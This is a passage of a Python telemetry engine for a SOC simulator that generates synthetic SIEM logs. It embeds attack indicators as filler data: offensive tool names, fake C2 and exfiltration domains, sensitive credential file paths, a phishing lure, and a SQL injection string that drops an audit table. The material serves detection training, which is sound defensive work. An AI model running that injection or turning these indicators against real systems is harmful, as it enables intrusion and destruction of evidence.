"""
CyberTwin SOC - Telemetry Engine
==================================
Transforms simulation events into realistic, SIEM-ready log entries with
rich metadata (PIDs, ports, file paths, user agents, etc.).

Each event type (authentication, process, network, file_access, email, dns,
firewall, web_access) has a dedicated enrichment handler that adds context
fields matching real-world SIEM log formats.
"""

from __future__ import annotations

import json
import random
import uuid
from collections import Counter
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Optional

from .models import LogEvent, LogSeverity, LogSource

PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent

# ---------------------------------------------------------------------------
# Realistic filler data pools
# ---------------------------------------------------------------------------

_WINDOWS_PROCESSES = [
    "svchost.exe", "explorer.exe", "lsass.exe", "csrss.exe", "winlogon.exe",
    "taskhostw.exe", "RuntimeBroker.exe", "dwm.exe", "conhost.exe",
    "services.exe", "spoolsv.exe", "SearchIndexer.exe", "MsMpEng.exe",
    "WmiPrvSE.exe", "dllhost.exe",
]

_LINUX_PROCESSES = [
    "sshd", "bash", "cron", "systemd", "python3", "nginx", "httpd",
    "postgres", "mysqld", "rsyslogd", "auditd", "dockerd", "kubelet",
    "java", "node",
]

_SUSPICIOUS_PROCESSES = [
    "mimikatz.exe", "psexec.exe", "powershell.exe", "cmd.exe",
    "certutil.exe", "rundll32.exe", "regsvr32.exe", "mshta.exe",
    "wscript.exe", "cscript.exe", "bitsadmin.exe", "wmic.exe",
    "nc.exe", "nmap.exe", "whoami.exe",
]

_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "curl/8.4.0",
    "python-requests/2.31.0",
    "Wget/1.21.4",
]

_DNS_DOMAINS = [
    "google.com", "office365.com", "github.com", "amazonaws.com",
    "login.microsoftonline.com", "api.slack.com", "cdn.jsdelivr.net",
    "updates.example-corp.com", "intranet.local", "dc01.corp.local",
]

_SUSPICIOUS_DOMAINS = [
    "c2-server.evil.ru", "exfil.darknet.io", "payload.malware.cc",
    "update-check.suspicious.top", "cdn-static.phishing.xyz",
    "microsoftlogin-verify.com", "g00gle-auth.net",
]

_FILE_PATHS_WINDOWS = [
    r"C:\Windows\System32\config\SAM",
    r"C:\Windows\Temp\payload.exe",
    r"C:\Users\{user}\AppData\Local\Temp\tmp_{rand}.ps1",
    r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\beacon.exe",
    r"C:\Users\{user}\Documents\credentials.xlsx",
    r"C:\Windows\System32\drivers\etc\hosts",
]

_FILE_PATHS_LINUX = [
    "/etc/passwd", "/etc/shadow", "/tmp/.hidden_shell.sh",
    "/var/log/auth.log", "/home/{user}/.ssh/authorized_keys",
    "/opt/webapp/config/db.yml", "/var/www/html/uploads/shell.php",
]

_USERNAMES = [
    "jsmith", "admin", "svc_backup", "dbadmin", "webmaster",
    "analyst01", "hradmin", "svc_monitor", "deploy", "root",
    "SYSTEM", "LOCAL SERVICE", "NETWORK SERVICE",
]

_HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]

_HTTP_STATUS_CODES = [200, 201, 204, 301, 302, 400, 401, 403, 404, 500, 502, 503]

_PORTS = {
    "http": 80, "https": 443, "ssh": 22, "rdp": 3389, "smb": 445,
    "dns": 53, "ftp": 21, "smtp": 25, "imap": 993, "ldap": 389,
    "mysql": 3306, "postgres": 5432, "mssql": 1433, "redis": 6379,
}


# ---------------------------------------------------------------------------
# Helper utilities
# ---------------------------------------------------------------------------

def _rand_ip(internal: bool = True) -> str:
    if internal:
        return f"10.{random.randint(0, 255)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
    return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"


def _rand_pid() -> int:
    return random.randint(100, 65535)


def _rand_port(ephemeral: bool = False) -> int:
    if ephemeral:
        return random.randint(49152, 65535)
    return random.choice(list(_PORTS.values()))


def _rand_mac() -> str:
    return ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))


def _rand_bytes() -> int:
    return random.randint(64, 1_500_000)


def _fmt_ts(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def _resolve_path(template: str, user: str = "jsmith") -> str:
    return template.format(user=user, rand=uuid.uuid4().hex[:8])


# ---------------------------------------------------------------------------
# TelemetryEngine
# ---------------------------------------------------------------------------

class TelemetryEngine:
    """Transforms high-level simulation events into detailed, realistic log
    entries suitable for SIEM ingestion and detection-rule evaluation.

    The engine maintains an internal log store that accumulates across
    calls to ``generate_logs``, enabling post-hoc queries by type,
    severity, host, and chronological timeline.
    """

    def __init__(self) -> None:
        """Initialize an empty telemetry engine with no stored logs."""
        self._logs: list[LogEvent] = []

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def clear(self) -> None:
        """Reset the internal log store to free memory between simulations."""
        self._logs.clear()

    def generate_logs(self, events: list[dict[str, Any]]) -> list[LogEvent]:
        """Accept a list of simulation events and return enriched LogEvent
        objects.  Each event dict is expected to contain at least:
            - event_type (str)
            - timestamp (str | datetime, optional -- generated if missing)
            - is_malicious (bool, optional)
            - technique_id (str, optional)
            - scenario_id (str, optional)
        Extra keys are passed through as raw_data.
        """
        generated: list[LogEvent] = []
        for event in events:
            logs = self._transform_event(event)
            generated.extend(logs)
        self._logs.extend(generated)
        return generated

    def get_logs_by_type(self, log_type: str) -> list[LogEvent]:
        """Return all stored logs whose *log_source* matches *log_type*
        (case-insensitive)."""
        lt = log_type.lower()
        return [log for log in self._logs if log.log_source.lower() == lt]

    def get_logs_by_severity(self, severity: str) -> list[LogEvent]:
        """Return all stored logs matching the given severity level."""
        sv = severity.lower()
        return [log for log in self._logs if log.severity.lower() == sv]

    def get_logs_by_host(self, host_id: str) -> list[LogEvent]:
        """Return all stored logs where *src_host* or *dst_host* matches
        *host_id* (case-insensitive)."""
        hid = host_id.lower()
        return [
            log for log in self._logs
            if log.src_host.lower() == hid or log.dst_host.lower() == hid
        ]

    def get_timeline(self) -> list[LogEvent]:
        """Return all stored logs sorted chronologically by timestamp."""
        return sorted(self._logs, key=lambda log: log.timestamp)

    def export_logs(self, format: str = "json") -> str:  # noqa: A002
        """Serialise all stored logs.  Currently supports ``json``."""
        if format == "json":
            return json.dumps(
                [log.to_dict() for log in self._logs],
                indent=2,
                default=str,
            )
        raise ValueError(f"Unsupported export format: {format}")

    def get_statistics(self) -> dict[str, Any]:
        """Return summary counts grouped by log_source, severity and host."""
        by_type: Counter[str] = Counter()
        by_severity: Counter[str] = Counter()
        by_host: Counter[str] = Counter()

        for log in self._logs:
            by_type[log.log_source] += 1
            by_severity[log.severity] += 1
            if log.src_host:
                by_host[log.src_host] += 1
            if log.dst_host and log.dst_host != log.src_host:
                by_host[log.dst_host] += 1

        return {
            "total_logs": len(self._logs),
            "malicious_logs": sum(1 for log in self._logs if log.is_malicious),
            "benign_logs": sum(1 for log in self._logs if not log.is_malicious),
            "by_type": dict(by_type),
            "by_severity": dict(by_severity),
            "by_host": dict(by_host),
        }

    # ------------------------------------------------------------------
    # Internal: event -> LogEvent(s)
    # ------------------------------------------------------------------

    def _transform_event(self, event: dict[str, Any]) -> list[LogEvent]:
        """Route an event to the appropriate enrichment handler."""
        etype = event.get("event_type", "generic").lower()
        ts = self._resolve_timestamp(event)
        is_mal = event.get("is_malicious", False)
        technique = event.get("technique_id")
        scenario = event.get("scenario_id")

        handler = self._HANDLERS.get(etype)
        if handler is None:
            return self._generic_event(event, ts, is_mal, technique, scenario)
        return handler(self, event, ts, is_mal, technique, scenario)

    @staticmethod
    def _resolve_timestamp(event: dict[str, Any]) -> datetime:
        raw = event.get("timestamp")
        if isinstance(raw, datetime):
            return raw
        if isinstance(raw, str):
            for fmt in ("%Y-%m-%dT%H:%M:%S.%fZ", "%Y-%m-%dT%H:%M:%SZ",
                        "%Y-%m-%d %H:%M:%S"):
                try:
                    return datetime.strptime(raw, fmt)
                except ValueError:
                    continue
        return datetime.now(timezone.utc)

    # ------------------------------------------------------------------
    # Enrichment handlers -- each returns a list[LogEvent]
    # ------------------------------------------------------------------

    def _auth_event(
        self, event: dict, ts: datetime, is_mal: bool,
        technique: Optional[str], scenario: Optional[str],
    ) -> list[LogEvent]:
        user = event.get("user", random.choice(_USERNAMES))
        src_ip = event.get("src_ip", _rand_ip(not is_mal))
        dst_ip = event.get("dst_ip", _rand_ip(True))
        src_host = event.get("src_host", f"WKS-{random.randint(100, 999)}")
        dst_host = event.get("dst_host", f"DC-{random.randint(1, 3):02d}")
        success = event.get("success", not is_mal)
        auth_method = event.get("auth_method", random.choice(
            ["Kerberos", "NTLM", "LDAP", "Local", "SSO"]))

        severity = LogSeverity.INFO.value
        if is_mal:
            severity = LogSeverity.HIGH.value if not success else LogSeverity.MEDIUM.value
        elif not success:
            severity = LogSeverity.LOW.value

        status = "Success" if success else "Failure"
        desc = f"Logon {status} for user '{user}' via {auth_method} from {src_ip}"

        win_eid = 4624 if success else 4625
        win_desc = "An account was successfully logged on" if success else "An account failed to log on"

        return [LogEvent(
            timestamp=_fmt_ts(ts),
            log_source=LogSource.AUTHENTICATION.value,
            event_type="logon_success" if success else "logon_failure",
            severity=severity,
            src_host=src_host,
            src_ip=src_ip,
            dst_host=dst_host,
            dst_ip=dst_ip,
            user=user,
            process_name="lsass.exe",
            command_line="",
            description=desc,
            windows_event_id=win_eid,
            event_source="Windows Security",
            event_id_description=win_desc,
            raw_data={
                "EventID": win_eid,
                "LogonType": random.choice([2, 3, 7, 10]),
                "AuthenticationPackage": auth_method,
                "TargetDomainName": "CORP",
                "WorkstationName": src_host,
                "SourcePort": _rand_port(ephemeral=True),
                "ProcessId": _rand_pid(),
                "Status": "0x0" if success else "0xC000006D",
                "SubStatus": "0x0" if success else random.choice(
                    ["0xC000006A", "0xC0000064", "0xC0000072"]),
            },
            tags=["authentication", "windows_security"] + (["brute_force"] if is_mal else []),
            technique_id=technique,
            scenario_id=scenario,
            is_malicious=is_mal,
        )]

    def _process_event(
        self, event: dict, ts: datetime, is_mal: bool,
        technique: Optional[str], scenario: Optional[str],
    ) -> list[LogEvent]:
        user = event.get("user", random.choice(_USERNAMES))
        host = event.get("src_host", f"SRV-{random.randint(1, 50):03d}")
        host_ip = event.get("src_ip", _rand_ip(True))

        if is_mal:
            proc = event.get("process_name", random.choice(_SUSPICIOUS_PROCESSES))
            cmdline = event.get("command_line", self._gen_suspicious_cmdline(proc))
            severity = LogSeverity.HIGH.value
        else:
            proc = event.get("process_name", random.choice(
                _WINDOWS_PROCESSES + _LINUX_PROCESSES))
            cmdline = event.get("command_line", proc)
            severity = LogSeverity.INFO.value

        pid = _rand_pid()
        ppid = _rand_pid()
        desc = f"Process created: {proc} (PID {pid}) by user '{user}' on {host}"

        return [LogEvent(
            timestamp=_fmt_ts(ts),
            log_source=LogSource.PROCESS.value,
            event_type="process_create",
            severity=severity,
            src_host=host,
            src_ip=host_ip,
            dst_host="",
            dst_ip="",
            user=user,
            process_name=proc,
            command_line=cmdline,
            description=desc,
            sysmon_event_id=1,
            windows_event_id=4688,
            event_source="Sysmon",
            event_id_description="Process Create",
            raw_data={
                "EventID": 1,
                "Channel": "Microsoft-Windows-Sysmon/Operational",
                "ProcessId": pid,
                "ParentProcessId": ppid,
                "ParentImage": random.choice(_WINDOWS_PROCESSES),
                "IntegrityLevel": random.choice(["Low", "Medium", "High", "System"]),
                "Hashes": f"SHA256={uuid.uuid4().hex}{uuid.uuid4().hex[:32]}",
                "FileVersion": f"{random.randint(1, 10)}.{random.randint(0, 9)}.{random.randint(0, 9999)}",
                "TerminalSessionId": random.randint(0, 5),
                "CurrentDirectory": f"C:\\Users\\{user}\\",
            },
            tags=["process", "sysmon"] + (["suspicious_execution"] if is_mal else []),
            technique_id=technique,
            scenario_id=scenario,
            is_malicious=is_mal,
        )]

    def _file_event(
        self, event: dict, ts: datetime, is_mal: bool,
        technique: Optional[str], scenario: Optional[str],
    ) -> list[LogEvent]:
        user = event.get("user", random.choice(_USERNAMES))
        host = event.get("src_host", f"WKS-{random.randint(100, 999)}")
        host_ip = event.get("src_ip", _rand_ip(True))
        action = event.get("action", random.choice(
            ["read", "write", "delete", "rename", "create"]))

        if is_mal:
            pool = _FILE_PATHS_WINDOWS if random.random() < 0.6 else _FILE_PATHS_LINUX
            filepath = event.get("file_path", _resolve_path(random.choice(pool), user))
            severity = LogSeverity.MEDIUM.value
        else:
            filepath = event.get("file_path",
                                 f"C:\\Users\\{user}\\Documents\\report_{random.randint(1, 100)}.docx")
            severity = LogSeverity.INFO.value

        desc = f"File {action}: {filepath} by user '{user}' on {host}"

        # Map file actions to appropriate Sysmon/Windows event IDs
        if action == "delete":
            sysmon_eid, sysmon_desc = 23, "File Delete"
        elif action == "create":
            sysmon_eid, sysmon_desc = 11, "File Create"
        else:
            sysmon_eid, sysmon_desc = 11, "File Create"

        return [LogEvent(
            timestamp=_fmt_ts(ts),
            log_source=LogSource.FILE_ACCESS.value,
            event_type=f"file_{action}",
            severity=severity,
            src_host=host,
            src_ip=host_ip,
            dst_host="",
            dst_ip="",
            user=user,
            process_name=event.get("process_name", "explorer.exe"),
            command_line="",
            description=desc,
            sysmon_event_id=sysmon_eid,
            windows_event_id=4663,
            event_source="Sysmon",
            event_id_description=sysmon_desc,
            raw_data={
                "EventID": sysmon_eid,
                "Channel": "Microsoft-Windows-Sysmon/Operational",
                "TargetFilename": filepath,
                "Action": action.upper(),
                "ProcessId": _rand_pid(),
                "FileSize": _rand_bytes(),
                "SHA256": uuid.uuid4().hex + uuid.uuid4().hex[:32],
            },
            tags=["file_access"] + (["sensitive_file"] if is_mal else []),
            technique_id=technique,
            scenario_id=scenario,
            is_malicious=is_mal,
        )]

    def _network_event(
        self, event: dict, ts: datetime, is_mal: bool,
        technique: Optional[str], scenario: Optional[str],
    ) -> list[LogEvent]:
        src_ip = event.get("src_ip", _rand_ip(True))
        dst_ip = event.get("dst_ip", _rand_ip(not is_mal))
        src_host = event.get("src_host", f"WKS-{random.randint(100, 999)}")
        dst_host = event.get("dst_host", f"SRV-{random.randint(1, 50):03d}")
        protocol = event.get("protocol", random.choice(
            ["TCP", "UDP", "TCP", "TCP"]))
        dst_port = event.get("dst_port", _rand_port())
        src_port = _rand_port(ephemeral=True)
        # Use explicit bytes from the event (e.g. attack scenarios) if provided
        _details = event.get("details", {})
        bytes_sent = (event.get("bytes_sent")
                      or _details.get("bytes_sent")
                      or _details.get("bytes_out")
                      or _rand_bytes())
        bytes_recv = event.get("bytes_recv") or _rand_bytes()

        severity = LogSeverity.MEDIUM.value if is_mal else LogSeverity.INFO.value
        direction = event.get("direction", "outbound")
        desc = (f"Network connection: {src_ip}:{src_port} -> "
                f"{dst_ip}:{dst_port} ({protocol} {direction})")

        return [LogEvent(
            timestamp=_fmt_ts(ts),
            log_source=LogSource.NETWORK.value,
            event_type="network_connection",
            severity=severity,
            src_host=src_host,
            src_ip=src_ip,
            dst_host=dst_host,
            dst_ip=dst_ip,
            user=event.get("user", ""),
            process_name=event.get("process_name", ""),
            command_line="",
            description=desc,
            sysmon_event_id=3,
            event_source="Sysmon",
            event_id_description="Network Connection",
            raw_data={
                "EventID": 3,
                "Protocol": protocol,
                "SourcePort": src_port,
                "DestinationPort": dst_port,
                "dst_port": dst_port,
                "Direction": direction,
                "BytesSent": bytes_sent,
                "BytesReceived": bytes_recv,
                "bytes_out": bytes_sent,
                "bytes_sent": bytes_sent,
                "Duration": round(random.uniform(0.01, 300.0), 3),
                "SourceMAC": _rand_mac(),
                "DestinationMAC": _rand_mac(),
                "PacketCount": random.randint(1, 5000),
            },
            tags=["network"] + (["c2_traffic"] if is_mal else []),
            technique_id=technique,
            scenario_id=scenario,
            is_malicious=is_mal,
        )]

    def _firewall_event(
        self, event: dict, ts: datetime, is_mal: bool,
        technique: Optional[str], scenario: Optional[str],
    ) -> list[LogEvent]:
        src_ip = event.get("src_ip", _rand_ip(not is_mal))
        dst_ip = event.get("dst_ip", _rand_ip(True))
        action = event.get("action", random.choice(["ALLOW", "DENY", "DROP"]))
        dst_port = event.get("dst_port", _rand_port())
        protocol = event.get("protocol", "TCP")

        severity = LogSeverity.LOW.value
        if action in ("DENY", "DROP"):
            severity = LogSeverity.MEDIUM.value if is_mal else LogSeverity.LOW.value

        desc = f"Firewall {action}: {src_ip} -> {dst_ip}:{dst_port} ({protocol})"

        fw_eid = 5156 if action == "ALLOW" else 5157
        fw_desc = ("Windows Filtering Platform allowed a connection"
                   if action == "ALLOW"
                   else "Windows Filtering Platform blocked a connection")

        return [LogEvent(
            timestamp=_fmt_ts(ts),
            log_source=LogSource.FIREWALL.value,
            event_type=f"firewall_{action.lower()}",
            severity=severity,
            src_host=event.get("src_host", ""),
            src_ip=src_ip,
            dst_host=event.get("dst_host", ""),
            dst_ip=dst_ip,
            user="",
            process_name="",
            command_line="",
            description=desc,
            windows_event_id=fw_eid,
            event_source="Windows Security",
            event_id_description=fw_desc,
            raw_data={
                "Action": action,
                "Protocol": protocol,
                "SourcePort": _rand_port(ephemeral=True),
                "DestinationPort": dst_port,
                "dst_port": dst_port,
                "destination_port": dst_port,
                "Rule": event.get("rule", f"Rule-{random.randint(1, 500)}"),
                "Zone": event.get("zone", random.choice(
                    ["DMZ", "Internal", "External", "Management"])),
                "Interface": random.choice(["eth0", "eth1", "bond0", "vlan10"]),
                "PacketLength": random.randint(40, 1500),
                "TCPFlags": random.choice(["SYN", "ACK", "SYN-ACK", "FIN", "RST"]),
            },
            tags=["firewall", "perimeter"],
            technique_id=technique,
            scenario_id=scenario,
            is_malicious=is_mal,
        )]

    def _dns_event(
        self, event: dict, ts: datetime, is_mal: bool,
        technique: Optional[str], scenario: Optional[str],
    ) -> list[LogEvent]:
        domain = event.get("domain")
        if domain is None:
            domain = random.choice(
                _SUSPICIOUS_DOMAINS if is_mal else _DNS_DOMAINS)

        src_ip = event.get("src_ip", _rand_ip(True))
        query_type = event.get("query_type", random.choice(
            ["A", "AAAA", "CNAME", "MX", "TXT", "NS"]))
        response_code = event.get("response_code", random.choice(
            ["NOERROR", "NXDOMAIN", "SERVFAIL"]))

        severity = LogSeverity.MEDIUM.value if is_mal else LogSeverity.INFO.value
        desc = f"DNS query: {domain} ({query_type}) from {src_ip} -> {response_code}"

        return [LogEvent(
            timestamp=_fmt_ts(ts),
            log_source=LogSource.DNS.value,
            event_type="dns_query",
            severity=severity,
            src_host=event.get("src_host", f"WKS-{random.randint(100, 999)}"),
            src_ip=src_ip,
            dst_host=event.get("dst_host", "DNS-01"),
            dst_ip=event.get("dst_ip", "10.0.0.53"),
            user=event.get("user", ""),
            process_name=event.get("process_name", ""),
            command_line="",
            description=desc,
            sysmon_event_id=22,
            event_source="Sysmon",
            event_id_description="DNS Query",
            raw_data={
                "QueryName": domain,
                "query": domain,
                "domain": domain,
                "QueryType": query_type,
                "record_type": query_type,
                "ResponseCode": response_code,
                "AnswerCount": random.randint(0, 5),
                "ResolvedIP": _rand_ip(False) if response_code == "NOERROR" else "",
                "TTL": random.choice([60, 300, 600, 3600, 86400]),
                "TransactionId": f"0x{random.randint(0, 65535):04x}",
                "ServerIP": "10.0.0.53",
            },
            tags=["dns"] + (["dga", "suspicious_domain"] if is_mal else []),
            technique_id=technique,
            scenario_id=scenario,
            is_malicious=is_mal,
        )]

    def _web_event(
        self, event: dict, ts: datetime, is_mal: bool,
        technique: Optional[str], scenario: Optional[str],
    ) -> list[LogEvent]:
        method = event.get("method", random.choice(_HTTP_METHODS[:3]))
        url = event.get("url", f"https://{'evil.example.com' if is_mal else 'app.corp.local'}"
                        f"/{'exploit.php' if is_mal else 'api/v1/data'}")
        status_code = event.get("status_code", random.choice(_HTTP_STATUS_CODES))
        user_agent = event.get("user_agent", random.choice(_USER_AGENTS))
        src_ip = event.get("src_ip", _rand_ip(True))

        severity = LogSeverity.INFO.value
        if is_mal:
            severity = LogSeverity.HIGH.value
        elif status_code >= 500:
            severity = LogSeverity.MEDIUM.value
        elif status_code in (401, 403):
            severity = LogSeverity.LOW.value

        desc = f"HTTP {method} {url} -> {status_code}"

        return [LogEvent(
            timestamp=_fmt_ts(ts),
            log_source=LogSource.WEB_ACCESS.value,
            event_type="http_request",
            severity=severity,
            src_host=event.get("src_host", f"WKS-{random.randint(100, 999)}"),
            src_ip=src_ip,
            dst_host=event.get("dst_host", "PROXY-01"),
            dst_ip=event.get("dst_ip", _rand_ip(False)),
            user=event.get("user", "-"),
            process_name=event.get("process_name", "chrome.exe"),
            command_line="",
            description=desc,
            event_source="Application",
            event_id_description="HTTP Request logged",
            raw_data={
                "Method": method,
                "URL": url,
                "StatusCode": status_code,
                "UserAgent": user_agent,
                "ContentLength": _rand_bytes(),
                "ResponseTime": round(random.uniform(5, 3000), 1),
                "Referer": event.get("referer", "-"),
                "ContentType": random.choice([
                    "text/html", "application/json", "application/octet-stream",
                    "image/png", "text/css",
                ]),
                "XForwardedFor": src_ip,
                "SessionId": uuid.uuid4().hex[:16],
            },
            tags=["web_access", "proxy"] + (["web_attack"] if is_mal else []),
            technique_id=technique,
            scenario_id=scenario,
            is_malicious=is_mal,
        )]

    def _email_event(
        self, event: dict, ts: datetime, is_mal: bool,
        technique: Optional[str], scenario: Optional[str],
    ) -> list[LogEvent]:
        sender = event.get("sender", "noreply@corp.local" if not is_mal
                           else "support@microsoftlogin-verify.com")
        recipient = event.get("recipient", f"{random.choice(_USERNAMES)}@corp.local")
        subject = event.get("subject", "Quarterly Report" if not is_mal
                            else "Urgent: Verify Your Account Immediately")

        severity = LogSeverity.HIGH.value if is_mal else LogSeverity.INFO.value
        desc = f"Email from {sender} to {recipient}: '{subject}'"

        return [LogEvent(
            timestamp=_fmt_ts(ts),
            log_source=LogSource.EMAIL.value,
            event_type="email_received",
            severity=severity,
            src_host=event.get("src_host", "MAIL-GW-01"),
            src_ip=event.get("src_ip", _rand_ip(not is_mal)),
            dst_host=event.get("dst_host", "EXCH-01"),
            dst_ip=event.get("dst_ip", "10.0.1.20"),
            user=recipient,
            process_name="",
            command_line="",
            description=desc,
            event_source="Application",
            event_id_description="Email received by mail gateway",
            raw_data={
                "Sender": sender,
                "Recipient": recipient,
                "Subject": subject,
                "MessageId": f"<{uuid.uuid4().hex[:12]}@{'evil.com' if is_mal else 'corp.local'}>",
                "HasAttachment": event.get("has_attachment", is_mal),
                "AttachmentName": event.get("attachment_name",
                                            "invoice.xlsm" if is_mal else ""),
                "AttachmentSize": _rand_bytes() if is_mal else 0,
                "SPF": "fail" if is_mal else "pass",
                "DKIM": "fail" if is_mal else "pass",
                "DMARC": "fail" if is_mal else "pass",
                "SpamScore": round(random.uniform(7.0, 10.0) if is_mal
                                   else random.uniform(0.0, 3.0), 1),
                "XMailer": event.get("x_mailer", "Microsoft Outlook 16.0"),
            },
            tags=["email"] + (["phishing"] if is_mal else []),
            technique_id=technique,
            scenario_id=scenario,
            is_malicious=is_mal,
        )]

    def _ids_event(
        self, event: dict, ts: datetime, is_mal: bool,
        technique: Optional[str], scenario: Optional[str],
    ) -> list[LogEvent]:
        rule_name = event.get("rule_name",
                              "ET TROJAN C2 Beacon Detected" if is_mal
                              else "ET POLICY DNS Query to .cloud TLD")
        sid = event.get("sid", random.randint(2000000, 2999999))
        src_ip = event.get("src_ip", _rand_ip(True))
        dst_ip = event.get("dst_ip", _rand_ip(False))

        severity = LogSeverity.CRITICAL.value if is_mal else LogSeverity.LOW.value
        action = event.get("action", "alert")
        desc = f"IDS {action.upper()}: {rule_name} [{src_ip} -> {dst_ip}]"

        return [LogEvent(
            timestamp=_fmt_ts(ts),
            log_source=LogSource.IDS.value,
            event_type=f"ids_{action}",
            severity=severity,
            src_host=event.get("src_host", ""),
            src_ip=src_ip,
            dst_host=event.get("dst_host", ""),
            dst_ip=dst_ip,
            user="",
            process_name="",
            command_line="",
            description=desc,
            event_source="IDS/Suricata",
            event_id_description=f"IDS alert: {rule_name[:50]}",
            raw_data={
                "RuleName": rule_name,
                "SID": sid,
                "Action": action,
                "Priority": 1 if is_mal else random.randint(2, 4),
                "Classification": event.get("classification",
                                            "A Network Trojan was detected" if is_mal
                                            else "Potentially Bad Traffic"),
                "Protocol": event.get("protocol", "TCP"),
                "SourcePort": _rand_port(ephemeral=True),
                "DestinationPort": event.get("dst_port", _rand_port()),
                "PayloadSize": random.randint(0, 1460),
                "Sensor": random.choice(["IDS-DMZ-01", "IDS-INT-01", "IDS-WAN-01"]),
                "Rev": random.randint(1, 15),
            },
            tags=["ids", "intrusion_detection"] + (["confirmed_threat"] if is_mal else []),
            technique_id=technique,
            scenario_id=scenario,
            is_malicious=is_mal,
        )]

    def _database_event(
        self, event: dict, ts: datetime, is_mal: bool,
        technique: Optional[str], scenario: Optional[str],
    ) -> list[LogEvent]:
        user = event.get("user", "dbadmin" if not is_mal else "sa")
        query = event.get("query", "SELECT * FROM users" if not is_mal
                          else "SELECT * FROM users; DROP TABLE audit_log;--")
        db_name = event.get("database", random.choice(
            ["production", "hr_db", "inventory", "auth_db"]))
        host = event.get("src_host", f"DB-{random.randint(1, 5):02d}")

        severity = LogSeverity.HIGH.value if is_mal else LogSeverity.INFO.value
        desc = f"Database query on '{db_name}' by '{user}': {query[:80]}"

        return [LogEvent(
            timestamp=_fmt_ts(ts),
            log_source=LogSource.DATABASE.value,
            event_type="db_query",
            severity=severity,
            src_host=host,
            src_ip=event.get("src_ip", _rand_ip(True)),
            dst_host="",
            dst_ip="",
            user=user,
            process_name=event.get("process_name", "sqlservr.exe"),
            command_line="",
            description=desc,
            event_source="Application",
            event_id_description="Database query executed",
            raw_data={
                "Database": db_name,
                "Query": query,
                "RowsAffected": random.randint(0, 10000),
                "Duration_ms": round(random.uniform(0.5, 5000.0), 2),
                "ClientIP": _rand_ip(True),
                "ApplicationName": random.choice([
                    "Microsoft SQL Server Management Studio",
                    "webapp-backend", "reporting-svc", "sqlcmd",
                ]),
                "ServerVersion": "15.0.4316.3",
                "ConnectionId": random.randint(50, 9999),
            },
            tags=["database"] + (["sql_injection"] if is_mal else []),
            technique_id=technique,
            scenario_id=scenario,
            is_malicious=is_mal,
        )]

    def _security_event(
        self, event: dict, ts: datetime, is_mal: bool,
        technique: Optional[str], scenario: Optional[str],
    ) -> list[LogEvent]:
        alert_name = event.get("alert_name",
                               "Privilege Escalation Detected" if is_mal
                               else "Security Policy Applied")
        host = event.get("src_host", f"SRV-{random.randint(1, 50):03d}")
        user = event.get("user", random.choice(_USERNAMES))

        severity = LogSeverity.CRITICAL.value if is_mal else LogSeverity.INFO.value
        desc = event.get("description") or f"Security event on {host}: {alert_name}"

        return [LogEvent(
            timestamp=_fmt_ts(ts),
            log_source=LogSource.SECURITY.value,
            event_type="security_alert",
            severity=severity,
            src_host=host,
            src_ip=event.get("src_ip", _rand_ip(True)),
            dst_host=event.get("dst_host", ""),
            dst_ip=event.get("dst_ip", ""),
            user=user,
            process_name=event.get("process_name", ""),
            command_line=event.get("command_line", ""),
            description=desc,
            windows_event_id=4672,
            event_source="Windows Security",
            event_id_description="Special privileges assigned to new logon",
            raw_data={
                "AlertName": alert_name,
                "AlertId": str(uuid.uuid4()),
                "Confidence": round(random.uniform(0.6, 1.0) if is_mal
                                    else random.uniform(0.1, 0.5), 2),
                "Source": "Endpoint Protection",
                "Action": event.get("action", "quarantine" if is_mal else "log"),
                "RiskScore": random.randint(70, 100) if is_mal else random.randint(1, 30),
            },
            tags=["security", "alert"] + (event.get("tags") or (["threat"] if is_mal else [])),
            technique_id=technique,
            scenario_id=scenario,
            is_malicious=is_mal,
        )]

    def _application_event(
        self, event: dict, ts: datetime, is_mal: bool,
        technique: Optional[str], scenario: Optional[str],
    ) -> list[LogEvent]:
        app = event.get("application", random.choice([
            "CRM", "ERP", "HRPortal", "DevOps-CI", "Intranet"]))
        action = event.get("action", random.choice([
            "login", "data_export", "config_change", "api_call"]))
        user = event.get("user", random.choice(_USERNAMES))
        host = event.get("src_host", f"APP-{random.randint(1, 10):02d}")

        severity = LogSeverity.MEDIUM.value if is_mal else LogSeverity.INFO.value
        desc = f"Application '{app}' event: {action} by user '{user}'"

        return [LogEvent(
            timestamp=_fmt_ts(ts),
            log_source=LogSource.APPLICATION.value,
            event_type=f"app_{action}",
            severity=severity,
            src_host=host,
            src_ip=event.get("src_ip", _rand_ip(True)),
            dst_host="",
            dst_ip="",
            user=user,
            process_name=event.get("process_name", "w3wp.exe"),
            command_line="",
            description=desc,
            event_source="Application",
            event_id_description=f"Application event: {action}",
            raw_data={
                "Application": app,
                "Action": action,
                "SessionDuration": random.randint(1, 7200),
                "RequestId": str(uuid.uuid4()),
                "ClientVersion": f"{random.randint(1, 5)}.{random.randint(0, 9)}.{random.randint(0, 99)}",
                "Module": event.get("module", "core"),
                "ResponseCode": 200 if not is_mal else random.choice([200, 403, 500]),
            },
            tags=["application"] + (["insider_threat"] if is_mal else []),
            technique_id=technique,
            scenario_id=scenario,
            is_malicious=is_mal,
        )]

    def _generic_event(
        self, event: dict, ts: datetime, is_mal: bool,
        technique: Optional[str], scenario: Optional[str],
    ) -> list[LogEvent]:
        """Fallback handler for unrecognised event types."""
        desc = event.get("description", f"Generic event: {event.get('event_type', 'unknown')}")
        severity = LogSeverity.MEDIUM.value if is_mal else LogSeverity.INFO.value

        return [LogEvent(
            timestamp=_fmt_ts(ts),
            log_source=LogSource.SECURITY.value,
            event_type=event.get("event_type", "generic"),
